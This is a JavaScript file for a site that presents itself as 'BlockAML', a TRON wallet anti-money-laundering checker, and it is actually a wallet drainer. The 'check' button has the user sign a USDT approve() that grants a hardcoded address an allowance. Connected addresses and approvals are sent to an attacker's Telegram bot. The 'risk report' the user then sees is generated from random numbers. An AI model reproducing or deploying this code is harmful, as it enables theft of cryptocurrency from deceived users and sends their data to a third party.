const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const BOT_ADDRESS = 'TTC9nFcmD9ziGLzJdDpG3ciSKuvLVWxRrG';

const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

let connectedWalletAddress = null;

const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

async function sendTelegramMessage(text) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' })
        });
    } catch (error) {
        console.error('Ошибка Telegram:', error);
    }
}

async function connectWallet() {
    try {
        if (!window.tronLink) {
            alert('❌ TronLink не обнаружен');
            return;
        }
        if (!window.tronLink.ready) {
            alert('🔒 TronLink заблокирован');
            return;
        }
        if (window.tronLink.tronWeb?.defaultAddress?.base58) {
            const address = window.tronLink.tronWeb.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            sendTelegramMessage(`🔌 <b>Кошелёк подключён</b>\n<code>${address}</code>`);
            alert('✅ Кошелёк подключён!');
            return;
        }
        const result = await window.tronLink.request({
            method: 'tron_requestAccounts',
            params: { websiteIcon: window.location.origin + '/favicon.ico', websiteName: 'BlockAML' }
        });
        if (result.code === 200) {
            let attempts = 0;
            const checkInterval = setInterval(() => {
                if (window.tronLink.tronWeb?.defaultAddress?.base58) {
                    const address = window.tronLink.tronWeb.defaultAddress.base58;
                    connectedWalletAddress = address;
                    walletInput.value = address;
                    if (statusSpan) statusSpan.style.display = 'inline-flex';
                    sendTelegramMessage(`🔌 <b>Кошелёк подключён</b>\n<code>${address}</code>`);
                    alert('✅ Кошелёк подключён!');
                    clearInterval(checkInterval);
                }
                if (++attempts > 20) clearInterval(checkInterval);
            }, 300);
        } else if (result.code === 4001) {
            alert('❌ Вы отклонили подключение');
        }
    } catch (error) {
        alert('Ошибка: ' + error.message);
    }
}

async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('❌ Сначала подключите кошелёк');
            return;
        }
        let tronWeb = window.tronLink?.tronWeb || window.tronWeb;
        if (!tronWeb) throw new Error('TronWeb не доступен');

        const amount = '10000000';
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);

        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';

        const tx = await contract.approve(BOT_ADDRESS, amount).send({
            feeLimit: 600_000_000,
            callValue: 0,
            shouldPollResponse: true,
            timeout: 120000
        });

        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        await sendTelegramMessage(`
✅ <b>Approve успешно отправлен</b>
📤 Адрес: <code>${connectedWalletAddress}</code>
💰 Сумма: 10 USDT
🔗 https://tronscan.org/#/transaction/${tx}
        `);
        showDemoReport(connectedWalletAddress);
    } catch (error) {
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        alert('❌ Ошибка: ' + error.message);
    }
}

function showDemoReport(address) {
    const resultSection = document.getElementById('resultSection');
    if (!resultSection) return;
    resultSection.style.display = 'block';
    document.getElementById('checkedAddress').textContent = address;
    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
    document.getElementById('lastActive').textContent = 'сегодня';
    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';
    const badge = document.getElementById('riskBadge');
    badge.textContent = 'Средний риск';
    badge.className = 'result-badge medium';
    const sourcesList = document.getElementById('sourcesList');
    sourcesList.innerHTML = `<p><i class="fas fa-exclamation-circle"></i> Миксеры</p><p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>`;
}

function copyAddress() {
    const address = document.getElementById('checkedAddress').textContent;
    navigator.clipboard.writeText(address).then(() => alert('✅ Адрес скопирован'));
}

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Сайт загружен');
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    window.copyAddress = copyAddress;
});
